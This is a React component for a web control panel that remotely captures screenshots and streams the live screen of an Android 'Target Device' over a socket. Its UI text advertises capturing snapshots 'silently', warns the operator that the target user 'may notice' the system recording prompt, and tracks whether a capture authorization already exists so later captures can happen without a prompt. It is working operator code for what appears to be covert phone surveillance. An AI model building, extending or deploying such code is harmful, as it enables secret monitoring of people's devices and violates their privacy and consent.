"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import { 
    Monitor, Play, Square, Camera, Download, Maximize, Minimize, 
    RefreshCw, AlertCircle, AlertTriangle, Shield, Wifi, WifiOff, CheckCircle2,
    Sliders, Clock, Sparkles, Image as ImageIcon, Trash2, Zap, Radio, X, ExternalLink
} from 'lucide-react';

interface ScreenViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
}

interface SavedCapture {
    id: string;
    url: string;
    timestamp: number;
    width?: number;
    height?: number;
}

export default function ScreenView({
    socket,
    userUuid,
    selectedDeviceId,
    isOnline,
    deviceName
}: ScreenViewProps) {
    const [isStreaming, setIsStreaming] = useState(false);
    const [isCapturing, setIsCapturing] = useState(false);
    const [streamQuality, setStreamQuality] = useState<number>(480);
    const [streamFps, setStreamFps] = useState<number>(15);
    const [currentFrame, setCurrentFrame] = useState<string | null>(null);
    const [frameDimensions, setFrameDimensions] = useState<{ width: number; height: number } | null>(null);
    const [statusMessage, setStatusMessage] = useState<{ type: 'info' | 'warning' | 'success' | 'error'; text: string } | null>(null);
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [savedCaptures, setSavedCaptures] = useState<SavedCapture[]>([]);
    const [hasToken, setHasToken] = useState<boolean | null>(null);
    const [showWarningModal, setShowWarningModal] = useState(false);
    const [warningAction, setWarningAction] = useState<'stream' | 'capture' | null>(null);
    const [previewCapture, setPreviewCapture] = useState<SavedCapture | null>(null);
    
    // Performance & Stats states
    const [realFps, setRealFps] = useState<number>(0);
    const [streamDuration, setStreamDuration] = useState<number>(0);

    const frameRef = useRef<HTMLImageElement>(null);
    const isStreamingRef = useRef(false);
    const frameCountRef = useRef(0);
    const lastFpsCalcRef = useRef(Date.now());
    const streamTimerRef = useRef<NodeJS.Timeout | null>(null);

    isStreamingRef.current = isStreaming;

    // Real-time FPS calculation & Stream duration counter
    useEffect(() => {
        let fpsInterval: NodeJS.Timeout | null = null;
        if (isStreaming) {
            frameCountRef.current = 0;
            lastFpsCalcRef.current = Date.now();
            setRealFps(0);
            setStreamDuration(0);

            // FPS ticker every 1 second
            fpsInterval = setInterval(() => {
                const now = Date.now();
                const deltaSec = (now - lastFpsCalcRef.current) / 1000;
                if (deltaSec > 0) {
                    const calculated = Math.round(frameCountRef.current / deltaSec);
                    setRealFps(calculated);
                }
                frameCountRef.current = 0;
                lastFpsCalcRef.current = now;
            }, 1000);

            // Duration timer every 1 second
            streamTimerRef.current = setInterval(() => {
                setStreamDuration(prev => prev + 1);
            }, 1000);
        } else {
            setRealFps(0);
            setStreamDuration(0);
            if (streamTimerRef.current) clearInterval(streamTimerRef.current);
        }

        return () => {
            if (fpsInterval) clearInterval(fpsInterval);
            if (streamTimerRef.current) clearInterval(streamTimerRef.current);
        };
    }, [isStreaming]);

    // Socket Event Listeners & Auto-Stop Cleanup on Unmount
    useEffect(() => {
        if (!socket) return;

        // Query initial token state from device
        if (selectedDeviceId && isOnline) {
            socket.emit('screen_status_query', {
                uuid: userUuid,
                targetDeviceId: selectedDeviceId
            });
        }

        const handleScreenFrame = (data: any) => {
            if (!data || !data.frame) return;
            const b64 = data.frame.startsWith('data:image') 
                ? data.frame 
                : `data:image/jpeg;base64,${data.frame}`;
            
            setCurrentFrame(b64);
            setIsCapturing(false);
            frameCountRef.current += 1;

            if (data.width && data.height) {
                setFrameDimensions({ width: data.width, height: data.height });
            }

            if (!data.isStream) {
                const newCapture: SavedCapture = {
                    id: `screen_${Date.now()}`,
                    url: b64,
                    timestamp: data.timestamp || Date.now(),
                    width: data.width,
                    height: data.height
                };
                setSavedCaptures(prev => [newCapture, ...prev.slice(0, 39)]);
                setStatusMessage({ type: 'success', text: 'Screenshot captured successfully.' });
            }
        };

        const handleScreenStatus = (data: any) => {
            if (!data) return;
            
            if (data.hasToken !== undefined) {
                setHasToken(!!data.hasToken);
            }

            if (data.status === 'token_needed') {
                setHasToken(false);
                setStatusMessage({
                    type: 'warning',
                    text: 'Authorization prompt requested on target device. Waiting for user consent...'
                });
            } else if (data.status === 'authorized') {
                setHasToken(true);
                setStatusMessage({
                    type: 'success',
                    text: 'Screen mirror authorized and live.'
                });
            } else if (data.status === 'stream_stopped') {
                setIsStreaming(false);
                if (data.reason === 'device_stopped') {
                    setHasToken(false);
                    setStatusMessage({
                        type: 'warning',
                        text: 'Screen mirror ended on device (screen was locked or session expired).'
                    });
                } else {
                    setStatusMessage({ type: 'info', text: 'Screen stream stopped.' });
                }
            } else if (data.status === 'stream_started') {
                setIsStreaming(true);
                setHasToken(true);
                setStatusMessage({ type: 'success', text: 'Ultra-fast screen mirror connected.' });
            } else if (data.status === 'denied' || data.error) {
                setIsCapturing(false);
                setIsStreaming(false);
                setHasToken(false);
                setStatusMessage({
                    type: 'error',
                    text: data.error || 'Screen capture permission was denied on device.'
                });
            } else if (data.status === 'no_token') {
                setHasToken(false);
            }
        };

        const handleScreenSaved = (data: any) => {
            if (data && data.url) {
                setSavedCaptures(prev => prev.map(c => 
                    c.timestamp === data.timestamp ? { ...c, url: data.url } : c
                ));
            }
        };

        socket.on('screen_frame', handleScreenFrame);
        socket.on('screen_status', handleScreenStatus);
        socket.on('screen_saved', handleScreenSaved);

        // Auto-stop stream on page navigation / component unmount
        return () => {
            if (isStreamingRef.current) {
                socket.emit('screen_stream_stop', {
                    uuid: userUuid,
                    targetDeviceId: selectedDeviceId
                });
            }
            socket.off('screen_frame', handleScreenFrame);
            socket.off('screen_status', handleScreenStatus);
            socket.off('screen_saved', handleScreenSaved);
        };
    }, [socket, selectedDeviceId, isOnline, userUuid]);

    // Format duration MM:SS
    const formatDuration = (totalSec: number) => {
        const m = Math.floor(totalSec / 60).toString().padStart(2, '0');
        const s = (totalSec % 60).toString().padStart(2, '0');
        return `${m}:${s}`;
    };

    // Single screenshot capture
    const handleCaptureScreenshot = (bypassWarning = false) => {
        if (!selectedDeviceId || !isOnline || !socket) return;

        if (!bypassWarning && hasToken === false) {
            setWarningAction('capture');
            setShowWarningModal(true);
            return;
        }

        setIsCapturing(true);
        setStatusMessage({ type: 'info', text: 'Requesting snapshot frame...' });

        socket.emit('screen_capture', {
            uuid: userUuid,
            targetDeviceId: selectedDeviceId,
            quality: 85
        });

        setTimeout(() => {
            setIsCapturing(false);
        }, 12000);
    };

    // Toggle live stream
    const handleToggleStream = (bypassWarning = false) => {
        if (!selectedDeviceId || !isOnline || !socket) return;

        if (isStreaming) {
            socket.emit('screen_stream_stop', {
                uuid: userUuid,
                targetDeviceId: selectedDeviceId
            });
            setIsStreaming(false);
            setStatusMessage({ type: 'info', text: 'Live mirror stopped.' });
        } else {
            if (!bypassWarning && hasToken === false) {
                setWarningAction('stream');
                setShowWarningModal(true);
                return;
            }

            socket.emit('screen_stream_start', {
                uuid: userUuid,
                targetDeviceId: selectedDeviceId,
                quality: streamQuality,
                fps: streamFps
            });
            setIsStreaming(true);
            setStatusMessage({ type: 'info', text: 'Initiating ultra-fast screen mirror...' });
        }
    };

    // Live Quality change (works seamlessly during stream)
    const handleQualityChange = (q: number) => {
        setStreamQuality(q);
        if (isStreaming && socket && selectedDeviceId) {
            socket.emit('screen_stream_start', {
                uuid: userUuid,
                targetDeviceId: selectedDeviceId,
                quality: q,
                fps: streamFps
            });
            setStatusMessage({ type: 'info', text: `Resolution adjusted to ${q}p.` });
        }
    };

    // Live FPS change (works seamlessly during stream)
    const handleFpsChange = (fps: number) => {
        setStreamFps(fps);
        if (isStreaming && socket && selectedDeviceId) {
            socket.emit('screen_stream_start', {
                uuid: userUuid,
                targetDeviceId: selectedDeviceId,
                quality: streamQuality,
                fps: fps
            });
            setStatusMessage({ type: 'info', text: `Refresh rate adjusted to ${fps} FPS.` });
        }
    };

    // Warning confirmation confirm
    const handleConfirmWarning = () => {
        setShowWarningModal(false);
        if (warningAction === 'stream') {
            handleToggleStream(true);
        } else if (warningAction === 'capture') {
            handleCaptureScreenshot(true);
        }
        setWarningAction(null);
    };

    // Download current image
    const handleDownloadCurrent = () => {
        if (!currentFrame) return;
        const link = document.createElement('a');
        link.href = currentFrame;
        link.download = `screenshot_${Date.now()}.jpg`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    const qualityOptions = [
        { val: 360, label: '360p Fast' },
        { val: 480, label: '480p Smooth' },
        { val: 720, label: '720p HD' },
        { val: 1080, label: '1080p Ultra' },
    ];

    const fpsOptions = [
        { val: 5, label: '5 FPS' },
        { val: 10, label: '10 FPS' },
        { val: 15, label: '15 FPS' },
        { val: 20, label: '20 FPS' },
        { val: 30, label: '30 FPS' },
    ];

    return (
        <div className={`space-y-4 sm:space-y-5 animate-in fade-in zoom-in-95 duration-400 pb-20 ${
            isFullscreen 
                ? 'fixed inset-0 z-[300] bg-[#090b10] p-3 sm:p-6 flex flex-col justify-between overflow-hidden' 
                : 'relative'
        }`}>
            {/* ── Top Clay Segment Switcher ── */}
            <div className="clay-card p-3 sm:p-4 flex flex-wrap items-center justify-between gap-4">
                
                {/* Left: Device Info & Stream indicator */}
                <div className="flex items-center gap-3 min-w-0">
                    <div className={`w-10 h-10 sm:w-11 sm:h-11 rounded-2xl flex items-center justify-center shrink-0 ${
                        isOnline 
                            ? 'bg-violet-500/20 text-violet-300 border border-violet-500/40 shadow-[0_0_20px_rgba(139,92,246,0.35)]' 
                            : 'bg-white/5 text-white/40 border border-white/10'
                    }`}>
                        <Monitor size={22} className={isStreaming ? 'animate-pulse' : ''} />
                    </div>
                    <div className="min-w-0">
                        <div className="flex items-center gap-2">
                            <span className="text-sm sm:text-base font-black text-white truncate">
                                {deviceName || 'Target Device'}
                            </span>
                            <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full font-bold uppercase tracking-wider flex items-center gap-1.5 shrink-0 ${
                                isOnline 
                                    ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30' 
                                    : 'bg-rose-500/10 text-rose-400 border border-rose-500/30'
                            }`}>
                                <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400 animate-pulse' : 'bg-rose-400'}`} />
                                {isOnline ? 'Online' : 'Offline'}
                            </span>
                        </div>
                        <div className="text-[11px] text-white/50 font-mono mt-0.5 flex items-center gap-2 truncate">
                            {isStreaming ? (
                                <span className="text-violet-400 font-bold flex items-center gap-1.5">
                                    <span className="w-2 h-2 rounded-full bg-violet-400 animate-ping" />
                                    Live Stream Active ({streamFps} FPS Target • {streamQuality}p)
                                </span>
                            ) : hasToken ? (
                                <span className="text-emerald-400/90 flex items-center gap-1">
                                    <CheckCircle2 size={12} /> Authorization Active
                                </span>
                            ) : (
                                <span>Hardware-accelerated zero-latency mirror</span>
                            )}
                        </div>
                    </div>
                </div>

                {/* Right: Quick Status Pills */}
                <div className="flex items-center gap-2">
                    {isStreaming ? (
                        <div className="clay-pill px-3.5 py-1.5 bg-violet-500/15 border border-violet-500/40 text-violet-300 flex items-center gap-2">
                            <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse shadow-[0_0_8px_#f43f5e]" />
                            <span className="text-[11px] font-mono font-black uppercase tracking-wider">
                                LIVE ({realFps} FPS • {formatDuration(streamDuration)})
                            </span>
                        </div>
                    ) : (
                        <div className="clay-pill px-3.5 py-1.5 bg-white/[0.04] border border-white/5 text-white/40 flex items-center gap-2">
                            <Radio className="w-3.5 h-3.5 text-violet-400/70" />
                            <span className="text-[11px] font-mono font-bold uppercase tracking-wider">STANDBY</span>
                        </div>
                    )}
                </div>
            </div>

            {/* ── Status Banner ── */}
            {statusMessage && (
                <div className={`p-3 rounded-2xl text-xs font-mono flex items-center justify-between gap-3 border shadow-lg animate-in slide-in-from-top-2 duration-200 ${
                    statusMessage.type === 'warning'
                        ? 'bg-amber-500/10 text-amber-300 border-amber-500/30'
                        : statusMessage.type === 'error'
                        ? 'bg-rose-500/10 text-rose-300 border-rose-500/30'
                        : statusMessage.type === 'success'
                        ? 'bg-emerald-500/10 text-emerald-300 border-emerald-500/30'
                        : 'bg-violet-500/10 text-violet-300 border-violet-500/30'
                }`}>
                    <div className="flex items-center gap-2.5">
                        {statusMessage.type === 'warning' ? <AlertCircle size={16} className="shrink-0" /> : <CheckCircle2 size={16} className="shrink-0" />}
                        <span className="leading-snug">{statusMessage.text}</span>
                    </div>
                    <button 
                        onClick={() => setStatusMessage(null)}
                        className="text-white/40 hover:text-white text-[11px] font-mono cursor-pointer shrink-0 px-2 py-0.5"
                    >
                        Dismiss
                    </button>
                </div>
            )}

            {/* ── Main Viewport Grid ── */}
            <div className={`grid grid-cols-1 ${isFullscreen ? 'h-full flex-1' : 'lg:grid-cols-4'} gap-4 sm:gap-5`}>
                
                {/* Center / Left: Viewfinder Screen Deck */}
                <div className={`flex flex-col gap-3 sm:gap-4 ${isFullscreen ? 'h-full w-full' : 'lg:col-span-3'}`}>
                    
                    {/* Viewport Monitor Frame */}
                    <div className={`clay-card p-2 sm:p-3 relative overflow-hidden flex flex-col ${
                        isFullscreen ? 'flex-1 h-full' : ''
                    }`}>
                        <div className={`w-full bg-[#06080d] rounded-[1.75rem] border border-white/10 overflow-hidden relative flex items-center justify-center shadow-[inset_0_4px_30px_rgba(0,0,0,0.95)] ${
                            isFullscreen ? 'flex-1 h-full' : 'min-h-[460px] sm:min-h-[580px] max-h-[740px]'
                        }`}>
                            
                            {/* Cyber Grid Reticle Pattern */}
                            <div className="absolute inset-0 opacity-20 pointer-events-none" style={{
                                backgroundImage: `
                                    linear-gradient(rgba(139,92,246,0.08) 1px, transparent 1px),
                                    linear-gradient(90deg, rgba(139,92,246,0.08) 1px, transparent 1px)
                                `,
                                backgroundSize: '36px 36px, 36px 36px'
                            }} />

                            {/* Live Viewport Content */}
                            {currentFrame ? (
                                <div className="relative h-full w-full flex items-center justify-center p-2 sm:p-4">
                                    <img
                                        ref={frameRef}
                                        src={currentFrame}
                                        alt="Target Device Screen"
                                        className="max-h-full max-w-full object-contain rounded-2xl shadow-2xl border border-white/10 select-none pointer-events-none"
                                    />

                                    {/* Overlay HUD Stats Bar */}
                                    {isStreaming && (
                                        <div className="absolute top-4 left-4 bg-black/75 backdrop-blur-md border border-white/15 px-3.5 py-1.5 rounded-full flex items-center gap-2.5 text-[11px] font-mono text-white shadow-xl">
                                            <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse shadow-[0_0_8px_#f43f5e]" />
                                            <span className="font-bold tracking-wider">LIVE</span>
                                            <span className="text-white/30">•</span>
                                            <span className="text-violet-300 font-bold">{realFps} FPS</span>
                                            {frameDimensions && (
                                                <>
                                                    <span className="text-white/30">•</span>
                                                    <span className="text-white/70">{frameDimensions.width}×{frameDimensions.height}</span>
                                                </>
                                            )}
                                            <span className="text-white/30">•</span>
                                            <span className="text-white/50">{formatDuration(streamDuration)}</span>
                                        </div>
                                    )}

                                    {/* Overlay Top Right Quick Action Pill */}
                                    <div className="absolute top-4 right-4 flex items-center gap-1.5 bg-black/70 backdrop-blur-md border border-white/10 p-1 rounded-xl">
                                        <button
                                            onClick={handleDownloadCurrent}
                                            className="p-1.5 rounded-lg bg-white/5 hover:bg-white/15 text-white/80 hover:text-white transition-all cursor-pointer"
                                            title="Save Frame"
                                        >
                                            <Download size={14} />
                                        </button>
                                        <button
                                            onClick={() => setIsFullscreen(!isFullscreen)}
                                            className="p-1.5 rounded-lg bg-white/5 hover:bg-white/15 text-white/80 hover:text-white transition-all cursor-pointer"
                                            title="Fullscreen"
                                        >
                                            {isFullscreen ? <Minimize size={14} /> : <Maximize size={14} />}
                                        </button>
                                    </div>
                                </div>
                            ) : (
                                /* Empty / Standby Stage */
                                <div className="text-center p-8 max-w-sm mx-auto space-y-4 relative z-10">
                                    <div className="w-20 h-20 mx-auto rounded-3xl bg-violet-500/10 border border-violet-500/30 flex items-center justify-center text-violet-400 shadow-[0_0_35px_rgba(139,92,246,0.3)]">
                                        <Monitor size={38} />
                                    </div>
                                    <div>
                                        <h3 className="text-base sm:text-lg font-black text-white">Screen Mirror Standby</h3>
                                        <p className="text-xs text-white/50 mt-1.5 leading-relaxed">
                                            Hardware-accelerated low latency display mirroring. Stream up to 30 FPS or capture instant snapshots silently.
                                        </p>
                                    </div>
                                    <div className="pt-2 flex flex-wrap items-center justify-center gap-3">
                                        <button
                                            onClick={() => handleCaptureScreenshot(false)}
                                            disabled={!isOnline || isCapturing}
                                            className="px-4 py-2.5 rounded-xl bg-white/10 hover:bg-white/15 border border-white/15 text-white font-mono font-bold text-xs flex items-center gap-2 cursor-pointer transition-all disabled:opacity-40"
                                        >
                                            {isCapturing ? <RefreshCw size={14} className="animate-spin" /> : <Camera size={14} />}
                                            <span>{isCapturing ? 'Grabbing...' : 'Take Snapshot'}</span>
                                        </button>
                                        <button
                                            onClick={() => handleToggleStream(false)}
                                            disabled={!isOnline}
                                            className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 hover:to-indigo-500 text-white font-mono font-black text-xs flex items-center gap-2 cursor-pointer shadow-[0_4px_20px_rgba(139,92,246,0.45)] transition-all disabled:opacity-40"
                                        >
                                            <Play size={14} className="fill-current" />
                                            <span>Start Live Mirror</span>
                                        </button>
                                    </div>
                                </div>
                            )}
                        </div>

                        {/* ── Floating Mobile-Friendly Bottom Dock ── */}
                        <div className="mt-3 p-2 bg-[#0c0e12] rounded-2xl border border-white/5 flex items-center justify-between gap-2">
                            <div className="flex items-center gap-2">
                                <button
                                    onClick={() => handleToggleStream(false)}
                                    disabled={!isOnline}
                                    className={`px-4 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider flex items-center gap-2 transition-all cursor-pointer shadow-lg ${
                                        isStreaming
                                            ? 'bg-rose-500 hover:bg-rose-600 text-white shadow-[0_0_20px_rgba(244,63,94,0.4)]'
                                            : 'bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 hover:to-indigo-500 text-white shadow-[0_4px_16px_rgba(139,92,246,0.4)]'
                                    } disabled:opacity-40 disabled:cursor-not-allowed`}
                                >
                                    {isStreaming ? (
                                        <>
                                            <Square size={13} className="fill-current" />
                                            <span>Stop Mirror</span>
                                        </>
                                    ) : (
                                        <>
                                            <Play size={13} className="fill-current" />
                                            <span>Live Mirror</span>
                                        </>
                                    )}
                                </button>

                                <button
                                    onClick={() => handleCaptureScreenshot(false)}
                                    disabled={!isOnline || isCapturing}
                                    className="px-3.5 py-2.5 rounded-xl text-xs font-bold font-mono uppercase tracking-wider flex items-center gap-2 bg-white/10 hover:bg-white/15 text-white border border-white/10 transition-all cursor-pointer disabled:opacity-40"
                                    title="Take Snapshot"
                                >
                                    {isCapturing ? <RefreshCw size={13} className="animate-spin" /> : <Camera size={13} />}
                                    <span className="hidden sm:inline">Snapshot</span>
                                </button>
                            </div>

                            <div className="flex items-center gap-1.5">
                                {currentFrame && (
                                    <button
                                        onClick={handleDownloadCurrent}
                                        className="p-2.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white transition-all cursor-pointer"
                                        title="Download Frame"
                                    >
                                        <Download size={15} />
                                    </button>
                                )}
                                <button
                                    onClick={() => setIsFullscreen(!isFullscreen)}
                                    className="p-2.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white transition-all cursor-pointer"
                                    title={isFullscreen ? 'Exit Fullscreen' : 'Fullscreen'}
                                >
                                    {isFullscreen ? <Minimize size={15} /> : <Maximize size={15} />}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Right / Sidebar: Live Controls & Settings Deck */}
                {!isFullscreen && (
                    <div className="flex flex-col gap-4">
                        
                        {/* Quality & Resolution Settings */}
                        <div className="clay-card p-4 space-y-3.5">
                            <div className="flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <Sliders size={15} className="text-violet-400" />
                                    <span className="text-xs font-black uppercase tracking-wider text-white">Stream Quality</span>
                                </div>
                                <span className="text-[10px] font-mono text-violet-300 font-bold bg-violet-500/10 px-2 py-0.5 rounded-md border border-violet-500/20">
                                    {streamQuality}p
                                </span>
                            </div>
                            
                            <div className="grid grid-cols-2 gap-2">
                                {qualityOptions.map(opt => (
                                    <button
                                        key={opt.val}
                                        onClick={() => handleQualityChange(opt.val)}
                                        className={`px-3 py-2 rounded-xl text-xs font-mono font-bold transition-all text-center cursor-pointer ${
                                            streamQuality === opt.val
                                                ? 'bg-gradient-to-r from-violet-600 to-indigo-600 text-white shadow-[0_0_12px_rgba(139,92,246,0.4)] border border-violet-400/40'
                                                : 'bg-[#0c0e12] border border-white/5 text-white/50 hover:text-white hover:border-white/15'
                                        }`}
                                    >
                                        {opt.label}
                                    </button>
                                ))}
                            </div>
                            <span className="text-[10px] text-white/40 font-mono block leading-relaxed">
                                {streamQuality <= 480 
                                    ? '⚡ Ultra-smooth low bandwidth mode (recommended for weak networks).' 
                                    : '💎 High resolution mode (crisper text and UI details).'}
                            </span>
                        </div>

                        {/* FPS & Refresh Rate Settings */}
                        <div className="clay-card p-4 space-y-3.5">
                            <div className="flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <Zap size={15} className="text-amber-400" />
                                    <span className="text-xs font-black uppercase tracking-wider text-white">Target Refresh Rate</span>
                                </div>
                                <span className="text-[10px] font-mono text-amber-300 font-bold bg-amber-500/10 px-2 py-0.5 rounded-md border border-amber-500/20">
                                    {streamFps} FPS
                                </span>
                            </div>

                            <div className="grid grid-cols-3 gap-2">
                                {fpsOptions.map(opt => (
                                    <button
                                        key={opt.val}
                                        onClick={() => handleFpsChange(opt.val)}
                                        className={`px-2.5 py-2 rounded-xl text-xs font-mono font-bold transition-all text-center cursor-pointer ${
                                            streamFps === opt.val
                                                ? 'bg-amber-500 text-black font-black shadow-[0_0_12px_rgba(245,158,11,0.4)] border border-amber-400'
                                                : 'bg-[#0c0e12] border border-white/5 text-white/50 hover:text-white hover:border-white/15'
                                        }`}
                                    >
                                        {opt.label}
                                    </button>
                                ))}
                            </div>
                            <span className="text-[10px] text-white/40 font-mono block leading-relaxed">
                                Up to 30 FPS hardware encoding. Settings adjust dynamically while stream is live.
                            </span>
                        </div>

                        {/* Diagnostics & Info Pill */}
                        <div className="clay-card p-4 space-y-2 text-[11px] font-mono text-white/60">
                            <div className="flex items-center justify-between">
                                <span>Token Status</span>
                                <span className={hasToken ? 'text-emerald-400 font-bold' : 'text-amber-400 font-bold'}>
                                    {hasToken === true ? 'Active' : hasToken === false ? 'Unregistered' : 'Checking...'}
                                </span>
                            </div>
                            <div className="flex items-center justify-between">
                                <span>Real FPS</span>
                                <span className="text-violet-300 font-bold">{realFps} FPS</span>
                            </div>
                            <div className="flex items-center justify-between">
                                <span>Stream Time</span>
                                <span className="text-white font-bold">{formatDuration(streamDuration)}</span>
                            </div>
                            <div className="flex items-center justify-between">
                                <span>Auto-Stop</span>
                                <span className="text-emerald-400/80">Active on Exit</span>
                            </div>
                        </div>
                    </div>
                )}
            </div>

            {/* ── Saved Captures Reel ── */}
            {savedCaptures.length > 0 && !isFullscreen && (
                <div className="clay-card p-4 sm:p-5 space-y-3.5">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <ImageIcon size={16} className="text-violet-400" />
                            <span className="text-xs font-black uppercase tracking-wider text-white">
                                Capture Reel ({savedCaptures.length})
                            </span>
                        </div>
                        <button
                            onClick={() => setSavedCaptures([])}
                            className="text-[11px] font-mono text-white/40 hover:text-rose-400 flex items-center gap-1.5 transition-colors cursor-pointer"
                        >
                            <Trash2 size={13} /> Clear Reel
                        </button>
                    </div>

                    <div className="grid grid-cols-3 sm:grid-cols-6 md:grid-cols-8 gap-3">
                        {savedCaptures.map(item => (
                            <div
                                key={item.id}
                                onClick={() => setPreviewCapture(item)}
                                className="group relative aspect-[9/16] bg-[#06080d] rounded-2xl overflow-hidden border border-white/10 hover:border-violet-500/60 transition-all cursor-pointer shadow-md"
                            >
                                <img
                                    src={item.url}
                                    alt="Capture"
                                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300"
                                />
                                <div className="absolute inset-0 bg-gradient-to-t from-black/85 via-transparent opacity-0 group-hover:opacity-100 transition-opacity flex flex-col justify-end p-2">
                                    <span className="text-[9px] font-mono text-white/90">
                                        {new Date(item.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                    </span>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* ── Security Permission Warning Modal ── */}
            {showWarningModal && (
                <div className="fixed inset-0 z-[500] bg-black/85 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
                    <div className="clay-card max-w-md w-full p-5 sm:p-6 border border-amber-500/40 shadow-[0_0_50px_rgba(245,158,11,0.25)] space-y-4">
                        <div className="flex items-start gap-3.5">
                            <div className="w-10 h-10 rounded-2xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shrink-0">
                                <AlertTriangle size={20} />
                            </div>
                            <div className="space-y-1">
                                <h3 className="text-sm sm:text-base font-black text-white">Target Authorization Notice</h3>
                                <p className="text-xs text-amber-200/80 leading-relaxed font-mono">
                                    Screen capture permission is not active on this device.
                                </p>
                            </div>
                        </div>

                        <div className="p-3 bg-amber-500/10 rounded-xl border border-amber-500/20 text-[11px] text-amber-200/80 font-mono space-y-1.5 leading-relaxed">
                            <p>
                                ⚠️ Starting the screen mirror now will display Android&apos;s system dialog (<span className="text-white font-bold">&quot;Start recording or casting?&quot;</span>) on the target device screen.
                            </p>
                            <p>
                                If the target user is currently actively viewing their phone, they may notice this prompt.
                            </p>
                        </div>

                        <div className="flex items-center justify-end gap-3 pt-2">
                            <button
                                onClick={() => { setShowWarningModal(false); setWarningAction(null); }}
                                className="px-4 py-2.5 rounded-xl text-xs font-mono font-bold bg-white/10 hover:bg-white/15 text-white/80 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={handleConfirmWarning}
                                className="px-4 py-2.5 rounded-xl text-xs font-mono font-black bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-black transition-all cursor-pointer shadow-lg shadow-amber-500/30"
                            >
                                Proceed &amp; Send Command
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ── Fullscreen Preview Modal for Saved Captures ── */}
            {previewCapture && (
                <div className="fixed inset-0 z-[600] bg-black/90 backdrop-blur-md flex items-center justify-center p-3 sm:p-6 animate-in fade-in duration-200">
                    <div className="relative max-w-4xl w-full h-[90vh] flex flex-col justify-between items-center">
                        <div className="w-full flex items-center justify-between p-3 bg-black/60 rounded-2xl border border-white/10">
                            <span className="text-xs font-mono text-white/80">
                                Captured: {new Date(previewCapture.timestamp).toLocaleString()}
                            </span>
                            <div className="flex items-center gap-2">
                                <a
                                    href={previewCapture.url}
                                    download={`capture_${previewCapture.timestamp}.jpg`}
                                    className="p-2 rounded-xl bg-white/10 hover:bg-white/20 text-white transition-colors cursor-pointer"
                                    title="Download"
                                >
                                    <Download size={16} />
                                </a>
                                <button
                                    onClick={() => setPreviewCapture(null)}
                                    className="p-2 rounded-xl bg-white/10 hover:bg-rose-500/30 hover:text-rose-300 text-white transition-colors cursor-pointer"
                                    title="Close"
                                >
                                    <X size={16} />
                                </button>
                            </div>
                        </div>

                        <div className="flex-1 w-full flex items-center justify-center p-3 overflow-hidden">
                            <img
                                src={previewCapture.url}
                                alt="Preview"
                                className="max-h-full max-w-full object-contain rounded-2xl shadow-2xl border border-white/10"
                            />
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
